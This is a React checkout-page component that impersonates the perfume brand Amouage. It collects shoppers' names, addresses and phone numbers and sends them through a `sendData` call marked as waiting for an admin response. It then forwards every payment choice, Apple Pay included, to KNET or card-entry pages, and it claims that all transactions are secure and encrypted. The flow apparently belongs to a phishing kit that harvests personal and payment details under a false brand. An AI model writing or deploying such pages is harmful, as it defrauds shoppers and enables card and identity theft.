import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { sendData, navigateToPage } from "@/lib/store";

export default function SummaryPayment() {
  const [, setLocation] = useLocation();
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [cartItems, setCartItems] = useState<any[]>([]);

  // Form fields
  const [country, setCountry] = useState("Oman");
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [address, setAddress] = useState("");
  const [apartment, setApartment] = useState("");
  const [city, setCity] = useState("");
  const [postalCode, setPostalCode] = useState("");
  const [phone, setPhone] = useState("");

  useEffect(() => {
    navigateToPage('ملخص الدفع');
    // Load cart from localStorage
    const cart = JSON.parse(localStorage.getItem('amouage_cart') || '[]');
    setCartItems(cart);
  }, []);

  const subtotal = cartItems.reduce((sum: number, item: any) => sum + ((parseFloat(item.priceNum) || 0) * item.quantity), 0);
  const totalItems = cartItems.reduce((sum: number, item: any) => sum + item.quantity, 0);

  const handlePayment = () => {
    if (!selectedPaymentMethod) return;
    setIsProcessing(true);

    const paymentMethodLabel = selectedPaymentMethod === 'card' ? 'بطاقة ائتمان' : selectedPaymentMethod === 'knet' ? 'كي نت' : 'Apple Pay';

    sendData({
      data: {
        paymentMethod: paymentMethodLabel,
        shippingAddress: { country, firstName, lastName, address, apartment, city, postalCode, phone },
        cartItems,
        subtotal,
        totalItems,
      },
      current: 'ملخص الدفع',
      nextPage: selectedPaymentMethod === 'knet' ? 'knet-payment' : selectedPaymentMethod === 'card' ? 'credit-card-payment' : 'bank-transfer',
      waitingForAdminResponse: false,
    });

    setTimeout(() => {
      setIsProcessing(false);
      if (selectedPaymentMethod === 'knet') {
        window.location.href = '/knet-payment';
      } else if (selectedPaymentMethod === 'card') {
        window.location.href = `/credit-card-payment?amount=${subtotal}`;
      } else {
        window.location.href = `/credit-card-payment?amount=${subtotal}`;
      }
    }, 1500);
  };

  return (
    <div className="min-h-screen bg-white" dir="ltr" style={{ fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
      {/* Header - AMOUAGE logo */}
      <div className="border-b border-gray-200 py-6 text-center">
        <h1 className="text-2xl tracking-[0.3em] font-light text-black" style={{ fontFamily: "'Times New Roman', serif" }}>AMOUAGE</h1>
        {/* Breadcrumb */}
        <nav className="flex items-center justify-center gap-2 text-xs text-gray-400 mt-3">
          <a href="/cart" className="text-gray-800 hover:underline">Cart</a>
          <span>&gt;</span>
          <span className="text-gray-800 font-medium">Information</span>
          <span>&gt;</span>
          <span>Shipping</span>
          <span>&gt;</span>
          <span>Payment</span>
        </nav>
      </div>

      <div className="max-w-[1200px] mx-auto flex flex-col lg:flex-row">
        {/* Left Side - Shipping Address + Payment Methods */}
        <div className="flex-1 px-6 lg:px-12 py-8 lg:border-r border-gray-200">
          
          {/* Shipping Address */}
          <h2 className="text-lg font-medium text-black mb-4">Shipping address</h2>
          
          {/* Info notice */}
          <div className="bg-gray-50 border border-gray-200 rounded-md p-4 mb-6 flex items-start gap-3">
            <svg className="w-5 h-5 text-gray-400 mt-0.5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            <p className="text-sm text-gray-600">Please ensure your full name and address are entered in English to avoid delays in processing your order</p>
          </div>

          {/* Country/Region */}
          <div className="mb-4">
            <label className="block text-xs text-gray-500 mb-1">Country/Region</label>
            <select 
              value={country} 
              onChange={(e) => setCountry(e.target.value)}
              className="w-full border border-gray-300 rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black"
            >
              <option value="Oman">Oman</option>
              <option value="UAE">United Arab Emirates</option>
              <option value="Saudi Arabia">Saudi Arabia</option>
              <option value="Kuwait">Kuwait</option>
              <option value="Bahrain">Bahrain</option>
              <option value="Qatar">Qatar</option>
            </select>
          </div>

          {/* First name / Last name */}
          <div className="grid grid-cols-2 gap-4 mb-4">
            <div>
              <input 
                type="text" 
                placeholder="First name" 
                value={firstName}
                onChange={(e) => setFirstName(e.target.value)}
                className="w-full border border-gray-300 rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black"
              />
            </div>
            <div>
              <input 
                type="text" 
                placeholder="Last name" 
                value={lastName}
                onChange={(e) => setLastName(e.target.value)}
                className="w-full border border-gray-300 rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black"
              />
            </div>
          </div>

          {/* Address */}
          <div className="mb-4">
            <input 
              type="text" 
              placeholder="Address" 
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              className="w-full border border-gray-300 rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black"
            />
          </div>

          {/* Apartment */}
          <div className="mb-4">
            <input 
              type="text" 
              placeholder="Apartment, suite, etc. (optional)" 
              value={apartment}
              onChange={(e) => setApartment(e.target.value)}
              className="w-full border border-gray-300 rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black"
            />
          </div>

          {/* City / Postal code */}
          <div className="grid grid-cols-2 gap-4 mb-4">
            <div>
              <input 
                type="text" 
                placeholder="City" 
                value={city}
                onChange={(e) => setCity(e.target.value)}
                className="w-full border border-gray-300 rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black"
              />
            </div>
            <div>
              <input 
                type="text" 
                placeholder="Postal code (optional)" 
                value={postalCode}
                onChange={(e) => setPostalCode(e.target.value)}
                className="w-full border border-gray-300 rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black"
              />
            </div>
          </div>

          {/* Phone */}
          <div className="mb-8">
            <input 
              type="tel" 
              placeholder="Phone" 
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              className="w-full border border-gray-300 rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black"
            />
          </div>

          {/* Payment Methods Section */}
          <div className="border-t border-gray-200 pt-8">
            <h2 className="text-lg font-medium text-black mb-4">Payment method</h2>
            <p className="text-sm text-gray-500 mb-4">All transactions are secure and encrypted.</p>

            <div className="space-y-3">
              {/* Credit Card */}
              <div
                className={`border rounded-md p-4 cursor-pointer transition-all ${
                  selectedPaymentMethod === 'card'
                    ? 'border-black bg-gray-50'
                    : 'border-gray-300 hover:border-gray-400'
                }`}
                onClick={() => setSelectedPaymentMethod('card')}
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                      selectedPaymentMethod === 'card' ? 'border-black' : 'border-gray-300'
                    }`}>
                      {selectedPaymentMethod === 'card' && (
                        <div className="w-2.5 h-2.5 rounded-full bg-black" />
                      )}
                    </div>
                    <span className="text-sm font-medium">Credit Card</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <svg className="w-8 h-5" viewBox="0 0 38 24" fill="none">
                      <rect width="38" height="24" rx="3" fill="#1A1F71"/>
                      <text x="7" y="16" fill="white" fontSize="10" fontWeight="bold">VISA</text>
                    </svg>
                    <svg className="w-8 h-5" viewBox="0 0 38 24" fill="none">
                      <rect width="38" height="24" rx="3" fill="#F5F5F5" stroke="#E0E0E0"/>
                      <circle cx="15" cy="12" r="7" fill="#EB001B"/>
                      <circle cx="23" cy="12" r="7" fill="#F79E1B"/>
                      <path d="M19 7.5a7 7 0 010 9" fill="#FF5F00"/>
                    </svg>
                  </div>
                </div>
                <p className="text-xs text-gray-500 mt-1 ml-8">Visa, Mastercard</p>
              </div>

              {/* KNET */}
              <div
                className={`border rounded-md p-4 cursor-pointer transition-all ${
                  selectedPaymentMethod === 'knet'
                    ? 'border-black bg-gray-50'
                    : 'border-gray-300 hover:border-gray-400'
                }`}
                onClick={() => setSelectedPaymentMethod('knet')}
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                      selectedPaymentMethod === 'knet' ? 'border-black' : 'border-gray-300'
                    }`}>
                      {selectedPaymentMethod === 'knet' && (
                        <div className="w-2.5 h-2.5 rounded-full bg-black" />
                      )}
                    </div>
                    <span className="text-sm font-medium">KNET</span>
                  </div>
                  <img src="/kpay/knet.png" alt="KNET" className="h-6 object-contain" onError={(e) => { e.currentTarget.style.display = 'none' }} />
                </div>
                <p className="text-xs text-gray-500 mt-1 ml-8">Pay with KNET debit card</p>
              </div>

              {/* Apple Pay */}
              <div
                className={`border rounded-md p-4 cursor-pointer transition-all ${
                  selectedPaymentMethod === 'apple'
                    ? 'border-black bg-gray-50'
                    : 'border-gray-300 hover:border-gray-400'
                }`}
                onClick={() => setSelectedPaymentMethod('apple')}
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                      selectedPaymentMethod === 'apple' ? 'border-black' : 'border-gray-300'
                    }`}>
                      {selectedPaymentMethod === 'apple' && (
                        <div className="w-2.5 h-2.5 rounded-full bg-black" />
                      )}
                    </div>
                    <span className="text-sm font-medium">Apple Pay</span>
                  </div>
                  <svg className="w-8 h-5" viewBox="0 0 38 24" fill="none">
                    <rect width="38" height="24" rx="3" fill="#000"/>
                    <text x="6" y="16" fill="white" fontSize="9" fontWeight="bold"> Pay</text>
                  </svg>
                </div>
                <p className="text-xs text-gray-500 mt-1 ml-8">Pay with Apple Pay</p>
              </div>
            </div>
          </div>

          {/* Pay Now Button */}
          <button
            className={`w-full mt-8 py-4 rounded-md text-white text-sm font-medium tracking-wider transition-all ${
              selectedPaymentMethod && !isProcessing
                ? 'bg-black hover:bg-gray-800 cursor-pointer'
                : 'bg-gray-300 cursor-not-allowed'
            }`}
            disabled={!selectedPaymentMethod || isProcessing}
            onClick={handlePayment}
          >
            {isProcessing ? (
              <span className="flex items-center justify-center gap-2">
                <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"/>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/>
                </svg>
                Processing...
              </span>
            ) : (
              'PAY NOW'
            )}
          </button>
        </div>

        {/* Right Side - Order Summary */}
        <div className="w-full lg:w-[420px] bg-gray-50 px-6 lg:px-10 py-8 border-t lg:border-t-0 border-gray-200">
          {/* Cart Items */}
          <div className="space-y-4 mb-6">
            {cartItems.map((item, idx) => (
              <div key={idx} className="flex items-center gap-4">
                {/* Product Image with quantity badge */}
                <div className="relative flex-shrink-0">
                  <div className="w-16 h-16 border border-gray-200 rounded-md overflow-hidden bg-white">
                    <img 
                      src={item.image} 
                      alt={item.name} 
                      className="w-full h-full object-cover"
                      onError={(e) => { e.currentTarget.src = '/placeholder.png' }}
                    />
                  </div>
                  <span className="absolute -top-2 -right-2 w-5 h-5 bg-gray-500 text-white text-xs rounded-full flex items-center justify-center font-medium">
                    {item.quantity}
                  </span>
                </div>
                {/* Product Info */}
                <div className="flex-1 min-w-0">
                  <p className="text-sm font-medium text-black truncate">{item.name}</p>
                  <p className="text-xs text-gray-500">{item.variant || ''}</p>
                </div>
                {/* Price */}
                <span className="text-sm font-medium text-black">${((parseFloat(item.priceNum) || 0) * item.quantity).toLocaleString()}</span>
              </div>
            ))}
          </div>

          {/* Discount Code */}
          <div className="flex gap-2 mb-6">
            <input 
              type="text" 
              placeholder="Discount code" 
              className="flex-1 border border-gray-300 rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black"
            />
            <button className="px-5 py-3 border border-gray-300 rounded-md text-sm text-gray-600 hover:bg-gray-100 transition-colors">
              Apply
            </button>
          </div>

          {/* Subtotal */}
          <div className="border-t border-gray-200 pt-4 space-y-2">
            <div className="flex justify-between text-sm">
              <span className="text-gray-600">Subtotal · {totalItems} items</span>
              <span className="font-medium">${subtotal.toLocaleString()}</span>
            </div>
            <div className="flex justify-between text-sm">
              <span className="text-gray-600">Shipping</span>
              <span className="text-sm text-gray-500">FREE</span>
            </div>
          </div>

          {/* Total */}
          <div className="border-t border-gray-200 mt-4 pt-4">
            <div className="flex justify-between items-center">
              <span className="text-base font-medium">Total</span>
              <div className="text-right">
                <span className="text-xs text-gray-500 mr-2">USD</span>
                <span className="text-xl font-medium">${subtotal.toLocaleString()}</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
